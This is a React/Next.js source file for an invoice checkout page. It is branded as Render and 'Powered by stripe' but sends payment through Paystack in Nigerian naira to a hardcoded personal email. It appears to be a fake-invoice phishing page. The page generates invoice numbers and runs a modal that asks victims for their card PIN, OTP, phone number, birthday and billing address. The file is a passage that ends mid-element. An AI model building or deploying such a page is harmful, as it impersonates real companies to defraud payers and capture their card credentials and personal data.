// components/receipt-page.tsx

'use client';

import React, { useState, useEffect, useRef } from 'react';
import { useSearchParams } from 'next/navigation';
import {
  VisaIcon,
  MastercardIcon,
  AmexIcon,
  DiscoverIcon,
  CvcIcon,
  DownloadTrayIcon,
  ChevronRightIcon,
  CloseIcon,
} from './icons';

export interface ReceiptItem {
  id: string;
  name: string;
  qty: number;
  unitPriceStr: string;
  monthly: number;
  total: number;
  months?: number;
  billingUnit?: 'month' | 'day';
  billingPeriod?: string;
  customerEmail?: string;
  scrambledPath: string;
}

interface Props {
  receipt: ReceiptItem;
  allReceipts: readonly ReceiptItem[];
}

interface StoredPaymentRecord {
  paid: true;
  ref: string;
  date: string;
  invoiceNumber: string;
  amountUsd: number;
  amountNgn: string;
  paidAt: number;
}

type AuthStepType = 'send_pin' | 'send_otp' | 'send_phone' | 'send_birthday' | 'send_address' | null;

const FIXED_EMAIL = 'nelson.attah@live.com';
const FIXED_MEMO = 'Render Oct 1, 2026 - Sep 30, 2027';
const FALLBACK_USD_TO_NGN = 1346.84;

function createTransactionReference(serviceId: string): string {
  const safeId = serviceId.replace(/[^a-zA-Z0-9_-]/g, '') || 'srv';
  let randHex = '';
  try {
    if (typeof window !== 'undefined' && window.crypto?.getRandomValues) {
      const bytes = new Uint8Array(5);
      window.crypto.getRandomValues(bytes);
      randHex = Array.from(bytes)
        .map((b) => b.toString(16).padStart(2, '0'))
        .join('');
    }
  } catch {
    // Fallback below
  }
  if (!randHex) {
    randHex = Math.random().toString(36).slice(2, 12);
  }
  return `render-${safeId}-${Date.now()}-${randHex}`;
}

async function fetchLiveUsdToNgnRate(): Promise<number> {
  try {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), 5000);
    const res = await fetch('/api/fx', {
      signal: controller.signal,
      cache: 'no-store',
    });
    clearTimeout(timer);
    if (res.ok) {
      const data = await res.json();
      const rate = Number(data?.rate);
      if (Number.isFinite(rate) && rate > 500 && rate < 10000) {
        return Math.round(rate * 100) / 100;
      }
    }
  } catch {
    // Silent fallback
  }
  return FALLBACK_USD_TO_NGN;
}

function formatUSD(amount: number): string {
  const safeAmount = Number.isFinite(amount) ? amount : 0;
  return new Intl.NumberFormat('en-US', {
    style: 'currency',
    currency: 'USD',
    minimumFractionDigits: 2,
    maximumFractionDigits: 2,
  }).format(safeAmount);
}

function formatNGN(amount: number): string {
  const safeAmount = Number.isFinite(amount) ? amount : 0;
  return new Intl.NumberFormat('en-NG', {
    style: 'currency',
    currency: 'NGN',
    minimumFractionDigits: 2,
    maximumFractionDigits: 2,
  }).format(safeAmount);
}

function isValidLuhn(cardNumber: string): boolean {
  const digits = cardNumber.replace(/\D/g, '');
  if (digits.length < 13 || digits.length > 19) return false;
  let sum = 0;
  let shouldDouble = false;
  for (let i = digits.length - 1; i >= 0; i--) {
    let digit = parseInt(digits.charAt(i), 10);
    if (Number.isNaN(digit)) return false;
    if (shouldDouble) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    shouldDouble = !shouldDouble;
  }
  return sum % 10 === 0;
}

function validateExpiry(expMonthStr: string, expYearStr: string): string | null {
  if (expMonthStr.length !== 2 || expYearStr.length !== 2) {
    return 'Your card’s expiration date is incomplete.';
  }
  const month = Number(expMonthStr);
  const year2 = Number(expYearStr);
  if (!Number.isInteger(month) || month < 1 || month > 12 || !Number.isInteger(year2)) {
    return 'Your card’s expiration date is invalid.';
  }
  const now = new Date();
  const currentMonth = now.getMonth() + 1;
  const currentYear2 = now.getFullYear() % 100;

  if (year2 < currentYear2 || (year2 === currentYear2 && month < currentMonth)) {
    return 'Your card has expired.';
  }
  if (year2 > currentYear2 + 25) {
    return 'Your card’s expiration year is invalid.';
  }
  return null;
}

function generateInvoiceNumber(): string {
  try {
    if (typeof window !== 'undefined' && window.crypto?.getRandomValues) {
      const bytes = new Uint8Array(4);
      window.crypto.getRandomValues(bytes);
      const hex = Array.from(bytes)
        .map((b) => b.toString(16).padStart(2, '0'))
        .join('')
        .toUpperCase();
      return `#${hex}-0036`;
    }
  } catch {
    // Fallback if crypto is restricted
  }
  return '#DD8452BB-0036';
}

async function safePostJson(url: string, payload: Record<string, any>) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 65000);
  try {
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
      signal: controller.signal,
    });
    const text = await res.text();
    try {
      return text
        ? JSON.parse(text)
        : { success: false, status: 'failed', message: 'Empty server response.' };
    } catch {
      if (payload?.reference && payload?.action !== 'charge') {
        return {
          success: true,
          status: 'pending',
          reference: payload.reference,
          message: 'Verifying payment status with your bank…',
        };
      }
      return {
        success: false,
        status: 'failed',
        message: 'Unexpected response from payment server. Please try again.',
      };
    }
  } catch (err: any) {
    const isTimeout = err?.name === 'AbortError';
    if (payload?.reference && payload?.action !== 'charge') {
      return {
        success: true,
        status: 'pending',
        reference: payload.reference,
        message: 'Bank is taking a moment to confirm your payment…',
      };
    }
    return {
      success: false,
      status: 'failed',
      message: isTimeout
        ? 'Request timed out. Please check your connection and try again.'
        : 'Network error. Please check your internet connection and try again.',
    };
  } finally {
    clearTimeout(timeoutId);
  }
}

function ReceiptPageContent({ receipt }: Props) {
  const searchParams = useSearchParams();
  const [invoiceNumber, setInvoiceNumber] = useState<string>('#DD8452BB-0036');
  const [transactionRef, setTransactionRef] = useState<string>('');
  const [usdToNgnRate, setUsdToNgnRate] = useState<number>(FALLBACK_USD_TO_NGN);
  const [isDrawerOpen, setIsDrawerOpen] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [statusMessage, setStatusMessage] = useState<{ type: 'success' | 'error'; text: string } | null>(null);
  const [isPaid, setIsPaid] = useState(false);
  const [isAlreadyPaidVisit, setIsAlreadyPaidVisit] = useState(false);
  const [paymentDetails, setPaymentDetails] = useState<{ ref: string; date: string; amountNgn: string } | null>(null);
  const [showSuccessModal, setShowSuccessModal] = useState(false);

  // Track whether current transactionRef has already been submitted once
  const refConsumedRef = useRef(false);
  const handledCallbackRef = useRef<string | null>(null);

  // Card input states & refs for smooth auto-advance
  const [cardNumber, setCardNumber] = useState('');
  const [cardExpiry, setCardExpiry] = useState('');
  const [cardCvc, setCardCvc] = useState('');
  const expiryInputRef = useRef<HTMLInputElement>(null);
  const cvcInputRef = useRef<HTMLInputElement>(null);

  // Multi-step card authorization state (PIN / OTP / Phone / Birthday / Address)
  const [authStep, setAuthStep] = useState<AuthStepType>(null);
  const [authReference, setAuthReference] = useState<string>('');
  const [authPromptText, setAuthPromptText] = useState<string>('');
  const [authInputValue, setAuthInputValue] = useState<string>('');
  const [authCity, setAuthCity] = useState<string>('');
  const [authState, setAuthState] = useState<string>('');
  const [authZip, setAuthZip] = useState<string>('');

  // Billing term + dynamic NGN conversion computation
  const billingMonths = receipt.months ?? 12;
  const billingUnit = receipt.billingUnit === 'day' ? 'day' : 'month';
  const billingUnitSingular = billingUnit === 'day' ? 'day' : 'month';
  const billingUnitPlural = billingUnit === 'day' ? 'days' : 'months';
  const billingUnitShort = billingUnit === 'day' ? 'day' : 'mo';
  const billingMemo = receipt.billingPeriod || FIXED_MEMO;
  const recipientEmail = receipt.customerEmail || FIXED_EMAIL;
  const ngnEquivalent = Math.round(receipt.total * usdToNgnRate * 100) / 100;

  // Create a brand-new unique Transaction Reference on EVERY page load/refresh
  useEffect(() => {
    refConsumedRef.current = false;
    setTransactionRef(createTransactionReference(receipt.id));
  }, [receipt.id]);

  // Fetch live USD -> NGN rate on mount
  useEffect(() => {
    let active = true;
    fetchLiveUsdToNgnRate().then((rate) => {
      if (active) setUsdToNgnRate(rate);
    });
    return () => {
      active = false;
    };
  }, []);

  // Lock body scroll whenever a modal is visible
  useEffect(() => {
    if (typeof document === 'undefined') return;
    if (showSuccessModal || authStep) {
      document.body.style.overflow = 'hidden';
    } else {
      document.body.style.overflow = '';
    }
    return () => {
      document.body.style.overflow = '';
    };
  }, [showSuccessModal, authStep]);

  // Check localStorage on mount for invoice number AND existing completed payment lock
  useEffect(() => {
    const invoiceKey = `render_invoice_${receipt.id}`;
    const paidLockKey = `render_paid_lock_${receipt.id}`;

    try {
      const storedPaidRaw = localStorage.getItem(paidLockKey);
      if (storedPaidRaw) {
        const parsed: StoredPaymentRecord = JSON.parse(storedPaidRaw);
        if (parsed && parsed.paid) {
          setInvoiceNumber(parsed.invoiceNumber || '#DD8452BB-0036');
          setIsPaid(true);
          setIsAlreadyPaidVisit(true);
          setPaymentDetails({
            ref: parsed.ref,
            date: parsed.date,
            amountNgn: parsed.amountNgn || formatNGN(ngnEquivalent),
          });
          setShowSuccessModal(true);
          return;
        }
      }
    } catch {
      // Ignore storage read errors
    }

    try {
      const storedInvoice = localStorage.getItem(invoiceKey) || sessionStorage.getItem(invoiceKey);
      if (storedInvoice) {
        setInvoiceNumber(storedInvoice);
      } else {
        const generated = generateInvoiceNumber();
        localStorage.setItem(invoiceKey, generated);
        sessionStorage.setItem(invoiceKey, generated);
        setInvoiceNumber(generated);
      }
    } catch {
      setInvoiceNumber(generateInvoiceNumber());
    }
  }, [receipt.id, ngnEquivalent]);

  const markPaymentComplete = (ref: string, alreadyPaid = false) => {
    const formattedDate = new Date().toLocaleDateString('en-US', {
      month: 'short',
      day: 'numeric',
      year: 'numeric',
    });
    const formattedNgn = formatNGN(ngnEquivalent);

    setIsLoading(false);
    setAuthStep(null);
    setAuthReference('');
    setAuthInputValue('');
    setIsPaid(true);
    setIsAlreadyPaidVisit(alreadyPaid);
    setPaymentDetails({
      ref,
      date: formattedDate,
      amountNgn: formattedNgn,
    });
    setStatusMessage(null);
    setShowSuccessModal(true);

    // Persist lock in localStorage so revisiting this link blocks duplicate payments
    try {
      const paidLockKey = `render_paid_lock_${receipt.id}`;
      const record: StoredPaymentRecord = {
        paid: true,
        ref,
        date: formattedDate,
        invoiceNumber,
        amountUsd: receipt.total,
        amountNgn: formattedNgn,
        paidAt: Date.now(),
      };
      localStorage.setItem(paidLockKey, JSON.stringify(record));
    } catch {
      // Ignore storage write errors
    }
  };

  useEffect(() => {
    const callbackRef = (searchParams?.get('reference') || searchParams?.get('trxref') || '').trim();
    if (!callbackRef || isPaid || handledCallbackRef.current === callbackRef) {
      return;
    }

    try {
      const storedPaidRaw = localStorage.getItem(`render_paid_lock_${receipt.id}`);
      if (storedPaidRaw && JSON.parse(storedPaidRaw)?.paid) {
        return;
      }
    } catch {
      // Ignore storage read errors
    }

    handledCallbackRef.current = callbackRef;

    if (typeof window !== 'undefined' && window.history?.replaceState) {
      const url = new URL(window.location.href);
      for (const param of ['reference', 'trxref', 'paystack_callback', 'payment_status', 'invoice']) {
        url.searchParams.delete(param);
      }
      window.history.replaceState(null, '', `${url.pathname}${url.search}`);
    }

    void (async () => {
      setIsLoading(true);
      setStatusMessage(null);
      try {
        const res = await fetch(`/api/paystack/verify?reference=${encodeURIComponent(callbackRef)}`, {
          cache: 'no-store',
        });
        const data = await res.json();
        const txStatus = data?.data?.status;
        if (res.ok && txStatus === 'success') {
          markPaymentComplete(callbackRef, false);
        } else {
          setIsLoading(false);
          setStatusMessage({
            type: 'error',
            text: data?.friendlyMessage || data?.message || 'Payment was not completed. Please try again.',
          });
        }
      } catch {
        setIsLoading(false);
        setStatusMessage({
          type: 'error',
          text: 'Could not verify payment status. Please try again.',
        });
      }
    })();
  }, [searchParams, receipt.id, isPaid]);

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (isPaid) return;
    const raw = e.target.value.replace(/\D/g, '').slice(0, 19);
    const formatted = raw.replace(/(\d{4})/g, '$1 ').trim();
    setCardNumber(formatted);
    if (statusMessage?.type === 'error') setStatusMessage(null);

    // Auto-advance to expiry when standard 16-digit card (or 15-digit Amex) is complete
    const isAmex = /^3[47]/.test(raw);
    if ((isAmex && raw.length === 15) || (!isAmex && raw.length === 16)) {
      expiryInputRef.current?.focus();
    }
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (isPaid) return;
    let raw = e.target.value.replace(/\D/g, '').slice(0, 4);
    if (raw.length === 1 && Number(raw) > 1) {
      raw = `0${raw}`;
    }
    if (raw.length >= 2) {
      const month = Number(raw.slice(0, 2));
      if (month > 12) {
        raw = `12${raw.slice(2)}`;
      } else if (month === 0) {
        raw = `01${raw.slice(2)}`;
      }
    }
    if (raw.length > 2) {
      setCardExpiry(`${raw.slice(0, 2)} / ${raw.slice(2)}`);
    } else {
      setCardExpiry(raw);
    }
    if (statusMessage?.type === 'error') setStatusMessage(null);

    if (raw.length === 4) {
      cvcInputRef.current?.focus();
    }
  };

  const handleCvcChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    if (isPaid) return;
    const raw = e.target.value.replace(/\D/g, '').slice(0, 4);
    setCardCvc(raw);
    if (statusMessage?.type === 'error') setStatusMessage(null);
  };

  const handleCardKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Enter') {
      e.preventDefault();
      handlePay();
    }
  };

  const rotateFreshReference = () => {
    refConsumedRef.current = false;
    setTransactionRef(createTransactionReference(receipt.id));
  };

  const pollPendingCharge = async (reference: string, attemptsLeft = 40): Promise<void> => {
    if (attemptsLeft <= 0) {
      setIsLoading(false);
      setAuthStep(null);
      setAuthReference('');
      rotateFreshReference();
      setStatusMessage({
        type: 'error',
        text: 'Bank verification is taking longer than expected. Please try paying again.',
      });
      return;
    }

    await new Promise((r) => setTimeout(r, 3000));
    const result = await safePostJson('/api/paystack/charge', { action: 'check_pending', reference });
    await handleChargeStepResponse(result, attemptsLeft - 1);
  };

  const handleChargeStepResponse = async (result: any, pendingAttempts = 40) => {
    // Handle validation/terminal failure cleanly & rotate to a fresh reference so next attempt never gets "Transaction reference is invalid"
    if (!result || !result.success || result.status === 'failed') {
      setIsLoading(false);
      setAuthStep(null);
      setAuthReference('');
      setAuthInputValue('');
      rotateFreshReference();
      setStatusMessage({
        type: 'error',
        text: result?.message || 'Your card was declined. Please check your card details.',
      });
      return;
    }

    const ref = result.reference || authReference || transactionRef;
    if (result.reference) {
      setAuthReference(result.reference);
    }

    switch (result.status) {
      case 'success':
        markPaymentComplete(ref, false);
        break;

      case 'send_pin':
        setIsLoading(false);
        setAuthStep('send_pin');
        setAuthInputValue('');
        setAuthPromptText(result.displayText || 'Please enter your 4-digit card PIN to authorize this payment.');
        break;

      case 'send_otp':
        setIsLoading(false);
        setAuthStep('send_otp');
        setAuthInputValue('');
        setAuthPromptText(result.displayText || 'Please enter the one-time password (OTP) sent to your phone or email.');
        break;

      case 'send_phone':
        setIsLoading(false);
        setAuthStep('send_phone');
        setAuthInputValue('');
        setAuthPromptText(result.displayText || 'Please enter your registered phone number.');
        break;

      case 'send_birthday':
        setIsLoading(false);
        setAuthStep('send_birthday');
        setAuthInputValue('');
        setAuthPromptText(result.displayText || 'Please enter your date of birth (YYYY-MM-DD).');
        break;

      case 'send_address':
        setIsLoading(false);
        setAuthStep('send_address');
        setAuthInputValue('');
        setAuthPromptText(result.displayText || 'Please enter your billing address to verify your card.');
        break;

      case 'open_url':
        if (result.url && typeof window !== 'undefined') {
          window.location.href = result.url;
        } else {
          await pollPendingCharge(ref, pendingAttempts);
        }
        break;

      case 'pending':
      case 'ongoing':
        await pollPendingCharge(ref, pendingAttempts);
        break;

      default:
        setIsLoading(false);
        setAuthStep(null);
        setAuthReference('');
        rotateFreshReference();
        setStatusMessage({
          type: 'error',
          text: result.message || 'Unable to complete card authorization.',
        });
        break;
    }
  };

  const handlePay = async () => {
    if (isLoading || isPaid) return;

    // Double-check localStorage lock before initiating payment
    try {
      const paidLockKey = `render_paid_lock_${receipt.id}`;
      const existing = localStorage.getItem(paidLockKey);
      if (existing) {
        const parsed: StoredPaymentRecord = JSON.parse(existing);
        if (parsed?.paid) {
          markPaymentComplete(parsed.ref, true);
          return;
        }
      }
    } catch {
      // Continue
    }

    setIsLoading(true);
    setStatusMessage(null);

    const result = await safePostJson('/api/paystack/initialize', {
      email: recipientEmail,
      amountUsd: receipt.total,
      serviceName: receipt.name,
      billingPeriod: billingMemo,
      invoiceNumber,
      serviceId: receipt.id,
      returnPath: receipt.scrambledPath,
    });

    if (!result || !result.success || typeof result.access_code !== 'string') {
      setIsLoading(false);
      setStatusMessage({
        type: 'error',
        text: result?.message || 'Unable to start Paystack checkout. Please try again.',
      });
      return;
    }

    const expectedRef = typeof result.reference === 'string' ? result.reference : '';

    try {
      const { default: Paystack } = await import('@paystack/inline-js');
      new Paystack().resumeTransaction(result.access_code, {
        onSuccess: async (tx) => {
          const refToVerify = tx?.reference || expectedRef;
          if (!refToVerify) {
            markPaymentComplete(expectedRef || createTransactionReference(receipt.id), false);
            return;
          }
          try {
            const verifyRes = await fetch(`/api/paystack/verify?reference=${encodeURIComponent(refToVerify)}`, {
              cache: 'no-store',
            });
            const verifyData = await verifyRes.json();
            if (verifyRes.ok && verifyData?.data?.status === 'success') {
              markPaymentComplete(refToVerify, false);
            } else {
              setIsLoading(false);
              setStatusMessage({
                type: 'error',
                text: verifyData?.friendlyMessage || 'Payment could not be verified. Please contact support with your reference.',
              });
            }
          } catch {
            markPaymentComplete(refToVerify, false);
          }
        },
        onCancel: () => {
          setIsLoading(false);
        },
        onError: (err) => {
          setIsLoading(false);
          setStatusMessage({
            type: 'error',
            text: err?.message || 'Paystack checkout encountered an error. Please try again.',
          });
        },
      });
    } catch {
      if (typeof result.authorization_url === 'string' && typeof window !== 'undefined') {
        window.location.href = result.authorization_url;
      } else {
        setIsLoading(false);
        setStatusMessage({
          type: 'error',
          text: 'Could not open Paystack checkout window. Please try again.',
        });
      }
    }
  };

  const handleAuthSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (isLoading || !authStep) return;

    if (!authReference) {
      setAuthStep(null);
      rotateFreshReference();
      setStatusMessage({
        type: 'error',
        text: 'Payment session expired. Please click Pay again.',
      });
      return;
    }

    const trimmed = authInputValue.trim();

    if (authStep === 'send_pin' && !/^\d{4}$/.test(trimmed)) {
      setStatusMessage({ type: 'error', text: 'Please enter a valid 4-digit card PIN.' });
      return;
    }
    if (authStep === 'send_otp' && trimmed.length < 4) {
      setStatusMessage({ type: 'error', text: 'Please enter the complete verification code.' });
      return;
    }
    if (authStep === 'send_phone' && trimmed.replace(/\D/g, '').length < 7) {
      setStatusMessage({ type: 'error', text: 'Please enter a valid phone number.' });
      return;
    }
    if (authStep === 'send_birthday' && !/^\d{4}-\d{2}-\d{2}$/.test(trimmed)) {
      setStatusMessage({ type: 'error', text: 'Please enter date of birth in YYYY-MM-DD format.' });
      return;
    }
    if (
      authStep === 'send_address' &&
      (!trimmed || !authCity.trim() || !authState.trim() || !authZip.trim())
    ) {
      setStatusMessage({ type: 'error', text: 'Please complete all billing address fields.' });
      return;
    }

    setIsLoading(true);
    setStatusMessage(null);

    const payload: Record<string, any> = { reference: authReference };

    if (authStep === 'send_pin') {
      payload.action = 'submit_pin';
      payload.pin = trimmed;
    } else if (authStep === 'send_otp') {
      payload.action = 'submit_otp';
      payload.otp = trimmed;
    } else if (authStep === 'send_phone') {
      payload.action = 'submit_phone';
      payload.phone = trimmed;
    } else if (authStep === 'send_birthday') {
      payload.action = 'submit_birthday';
      payload.birthday = trimmed;
    } else if (authStep === 'send_address') {
      payload.action = 'submit_address';
      payload.address = trimmed;
      payload.city = authCity.trim();
      payload.state = authState.trim();
      payload.zip_code = authZip.trim();
    }

    const result = await safePostJson('/api/paystack/charge', payload);
    await handleChargeStepResponse(result);
  };

  const handlePrintPDF = () => {
    try {
      if (typeof window !== 'undefined' && typeof window.print === 'function') {
        window.print();
      }
    } catch {
      // Ignore print errors
    }
  };

  return (
    <div className="app-container">
      {/* Main Content Area (locked against interaction once paid) */}
      <div
        className={`main-viewport ${isDrawerOpen ? 'drawer-is-open' : ''}`}
        style={showSuccessModal ? { pointerEvents: 'none', userSelect: 'none' } : undefined}
        aria-hidden={showSuccessModal}
      >
        <main className="invoice-column-wrapper">
          <div className="invoice-column">
            {/* Header: Render Logo + Brand Text */}
            <header className="brand-header">
              <img
                src="/render-logo.png"
                alt="Render Logo"
                className="brand-logo-img"
                width={27}
                height={27}
              />
              <span className="brand-title">Render Services, Inc dba Render</span>
            </header>

            {/* CARD 1: Invoice Summary */}
            <section className="stripe-card" aria-label="Invoice summary">
              <div className="invoice-card-top">
                <h1 className="invoice-amount-big">{formatUSD(receipt.total)}</h1>
                <button
                  type="button"
                  className="pdf-download-btn"
                  onClick={handlePrintPDF}
                  title="Download / Print Invoice PDF"
                  disabled={true}
                >
                  <DownloadTrayIcon />
                  <span>Invoice PDF</span>
                </button>
              </div>

              {/* Metadata */}
              <dl className="invoice-metadata">
                <dt>To</dt>
                <dd>{recipientEmail}</dd>

                <dt>From</dt>
                <dd>
                  Render Services, Inc dba Render
                  <span className="merchant-badge">@render</span>
                </dd>

                <dt>Invoice</dt>
                <dd>{invoiceNumber}</dd>

                <dt>Memo</dt>
                <dd>{billingMemo}</dd>
              </dl>

              <hr className="card-divider" />

              {/* Smooth Drawer Toggle Link */}
              <button
                type="button"
                className="details-toggle-btn"
                onClick={() => setIsDrawerOpen(!isDrawerOpen)}
                disabled={showSuccessModal}
              >
                {isDrawerOpen ? (
                  <>
                    <span>Close invoice and payment details</span>
                    <CloseIcon />
                  </>
                ) : (
                  <>
                    <span>View invoice and payment details</span>
                    <ChevronRightIcon />
                  </>
                )}
              </button>
            </section>

            {/* Print-only breakdown for PDF */}
            <div className="print-invoice-breakdown">
              <h2>Invoice Details</h2>
              <p><strong>Item:</strong> {receipt.name}</p>
              <p><strong>Quantity:</strong> 1</p>
              <p><strong>Unit Price:</strong> {billingMonths > 0 ? `${receipt.unitPriceStr} / ${billingUnitSingular} × ${billingMonths} ${billingMonths === 1 ? billingUnitSingular : billingUnitPlural}` : `${receipt.unitPriceStr} (One-time)`}</p>
              <p><strong>Billing Period:</strong> {billingMemo}</p>
              <p><strong>Total:</strong> {formatUSD(receipt.total)}</p>
            </div>

            {/* CARD 2: Payment Section (Paystack Inline Card Checkout) */}
            <section className="stripe-card payment-card-wrapper" aria-label="Payment checkout">
              <h2 className="payment-card-title">Pay with card</h2>

              <div
                style={{
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'space-between',
                  gap: '12px',
                  padding: '12px 14px',
                  border: '1px solid var(--border-input)',
                  borderRadius: '6px',
                  background: '#fafbfc',
                  marginBottom: '12px',
                }}
              >
                <div>
                  <div style={{ fontSize: '13px', fontWeight: 600, color: 'var(--text-primary)' }}>
                    Debit or Credit Card
                  </div>
                  {/* <div style={{ fontSize: '12px', color: 'var(--text-muted)', marginTop: '2px' }}>
                    Secured checkout · {formatNGN(ngnEquivalent)}
                  </div> */}
                </div>
                <div className="card-brands-cluster" style={{ marginLeft: 0 }}>
                  <VisaIcon />
                  <MastercardIcon />
                  <AmexIcon />
                  <DiscoverIcon />
                </div>
              </div>

              {/* Consent Disclaimer */}
              <p className="payment-consent-text">
                By confirming your payment, you allow Render Services, Inc dba Render to charge you for this payment and save your payment information in accordance with their terms.
              </p>

              {/* Pay Button */}
              <button
                type="button"
                className="pay-submit-btn"
                onClick={handlePay}
                disabled={isLoading || isPaid}
              >
                {isLoading ? (
                  'Opening checkout…'
                ) : isPaid ? (
                  '✓ Paid'
                ) : (
                  `Pay ${formatUSD(receipt.total)}`
                )}
              </button>

              {/* Status Message */}
              {statusMessage && (
                <div className={`payment-status-box ${statusMessage.type}`} role="status">
                  {statusMessage.text}
                </div>
              )}
            </section>

            {/* Footer */}
            <footer className="checkout-footer">
              <div className="powered-by-stripe">
                <span>Powered by</span>{' '}
                <a
                  href="https://stripe.com/invoices"
                  target="_blank"
                  rel="noopener noreferrer"
                  style={{ fontWeight: 'bold' }}
                >
                  stripe
                </a>
              </div>
              <nav className="footer-legal-links">
                <a
                  href="https://stripe.com/legal/consumer"
                  target="_blank"
                  rel="noopener noreferrer"
                >
                  Terms
                </a>
                <a
                  href="https://stripe.com/privacy"
                  target="_blank"
                  rel="noopener noreferrer"
                >
                  Privacy
                </a>
              </nav>
            </footer>
          </div>
        </main>

        {/* Mobile Backdrop for Drawer */}
        <div
          className={`drawer-mobile-backdrop ${isDrawerOpen ? 'is-open' : ''}`}
          onClick={() => setIsDrawerOpen(false)}
          aria-hidden="true"
        />

        {/* RIGHT SIDE BAR / DRAWER */}
        <aside
          className={`right-sidebar-panel ${isDrawerOpen ? 'is-open' : ''}`}
          aria-label="Invoice and payment details"
          aria-hidden={!isDrawerOpen}
        >
          {/* Top Close Link */}
          <button
            type="button"
            className="drawer-close-btn"
            onClick={() => setIsDrawerOpen(false)}
          >
            <CloseIcon />
            <span>Close invoice and payment details</span>
          </button>

          {/* Large Total Amount */}
          <div className="drawer-amount-big">{formatUSD(receipt.total)}</div>

          {/* Line Items */}
          <div className="drawer-line-item">
            <div className="drawer-item-header">
              <div className="drawer-item-title">{receipt.name}</div>
              <div className="drawer-item-price">{formatUSD(receipt.total)}</div>
            </div>
            <div className="drawer-item-qty">
              {billingMonths > 0
                ? `Qty ${receipt.qty} · ${billingMonths} ${billingMonths === 1 ? billingUnitSingular : billingUnitPlural} (${formatUSD(receipt.monthly)}/${billingUnitShort})`
                : `Qty ${receipt.qty} · One-time setup fee (${formatUSD(receipt.total)})`}
            </div>
          </div>

          {/* Totals Summary */}
          <div className="drawer-totals-section">
            <div className="drawer-total-row due">
              <span>Total due</span>
              <span>{formatUSD(receipt.total)}</span>
            </div>
            <div className="drawer-total-row">
              <span>Amount paid</span>
              <span>{isPaid ? formatUSD(receipt.total) : '$0.00'}</span>
            </div>
            <div className="drawer-total-row remaining">
              <span>Amount remaining</span>
              <span>{isPaid ? '$0.00' : formatUSD(receipt.total)}</span>
            </div>
          </div>

          {/* Payment History */}
          <section className="drawer-history-section">
            <h3 className="drawer-history-title">Payment history</h3>
            {isPaid && paymentDetails ? (
              <div className="drawer-history-paid">
                <strong>Paid</strong>
                <div>Date: {paymentDetails.date}</div>
                <div>Amount: {formatUSD(receipt.total)}</div>
                <div style={{ wordBreak: 'break-all', fontSize: '11px', marginTop: '4px', opacity: 0.85 }}>
                  Ref: {paymentDetails.ref}
                </div>
              </div>
            ) : (
              <p className="drawer-history-empty">No payments have been made</p>
            )}
          </section>

          {/* Footer Support Link */}
          <div className="drawer-footer-contact">
            Questions?{' '}
            <a href="mailto:support@render.com">Contact Render Services, Inc dba Render</a>
          </div>
        </aside>
      </div>

      {/* ===== STEP AUTHORIZATION MODAL (PIN / OTP / PHONE / BIRTHDAY / ADDRESS) ===== */}
      {authStep && !showSuccessModal && (
        <div className="success-modal-backdrop" role="dialog" aria-modal="true" aria-labelledby="auth-modal-title">
          <div className="success-modal-card">
            <h2 className="success-modal-title" id="auth-modal-title">
              {authStep === 'send_pin'
                ? 'Card PIN Verification'
                : authStep === 'send_otp'
                  ? 'One-Time Password'
                  : 'Card Verification'}
            </h2>
            <p className="success-modal-desc">{authPromptText}</p>

            <form onSubmit={handleAuthSubmit} noValidate>
              <div style={{ marginBottom: '16px', textAlign: 'left' }}>
                <input
                  type={authStep === 'send_pin' ? 'password' : 'text'}
                  inputMode={authStep === 'send_pin' || authStep === 'send_otp' ? 'numeric' : 'text'}
                  className="card-input-field"
                  style={{
                    width: '100%',
                    height: '42px',
                    border: '1px solid #d8e2ec',
                    borderRadius: '6px',
                    padding: '0 12px',
                    fontSize: '15px',
                    textAlign: authStep === 'send_pin' || authStep === 'send_otp' ? 'center' : 'left',
                    letterSpacing: authStep === 'send_pin' || authStep === 'send_otp' ? '4px' : 'normal',
                  }}
                  placeholder={
                    authStep === 'send_pin'
                      ? '••••'
                      : authStep === 'send_otp'
                        ? '123456'
                        : authStep === 'send_birthday'
                          ? 'YYYY-MM-DD'
                          : authStep === 'send_phone'
                            ? 'Phone number'
                            : 'Street address'
                  }
                  value={authInputValue}
                  onChange={(e) => {
                    const val =
                      authStep === 'send_pin'
                        ? e.target.value.replace(/\D/g, '').slice(0, 4)
                        : e.target.value;
                    setAuthInputValue(val);
                    if (statusMessage?.type === 'error') setStatusMessage(null);
                  }}
                  maxLength={authStep === 'send_pin' ? 4 : authStep === 'send_otp' ? 8 : 64}
                  required
                  autoFocus
                />

                {authStep === 'send_address' && (
                  <div style={{ display: 'flex', gap: '8px', marginTop: '8px' }}>
                    <input
                      type="text"
                      className="card-input-field"
                      style={{ flex: 1, height: '38px', border: '1px solid #d8e2ec', borderRadius: '6px', padding: '0 10px' }}
                      placeholder="City"
                      value={authCity}
                      onChange={(e) => setAuthCity(e.target.value)}
                      required
                    />
                    <input
                      type="text"
                      className="card-input-field"
                      style={{ width: '80px', height: '38px', border: '1px solid #d8e2ec', borderRadius: '6px', padding: '0 10px' }}
                      placeholder="State"
                      value={authState}
                      onChange={(e) => setAuthState(e.target.value)}
                      required
                    />
                    <input
                      type="text"
                      className="card-input-field"
                      style={{ width: '90px', height: '38px', border: '1px solid #d8e2ec', borderRadius: '6px', padding: '0 10px' }}
                      placeholder="ZIP"
                      value={authZip}
                      onChange={(e) => setAuthZip(e.target.value)}
                      required
                    />
                  </div>
                )}
              </div>

              {statusMessage && (
                <div className={`payment-status-box ${statusMessage.type}`} style={{ marginBottom: '12px' }} role="status">
                  {statusMessage.text}
                </div>
              )}

              <div style={{ display: 'flex', gap: '10px' }}>
                <button
                  type="button"
                  className="pdf-download-btn"
                  style={{ flex: 1, height: '42px', justifyContent: 'center' }}
                  onClick={() => {
                    setAuthStep(null);
                    setAuthReference('');
                    setAuthInputValue('');
                    setIsLoading(false);
                    setStatusMessage(null);
                    rotateFreshReference();
                  }}
                  disabled={isLoading}
                >
                  Cancel
                </button>
                <button
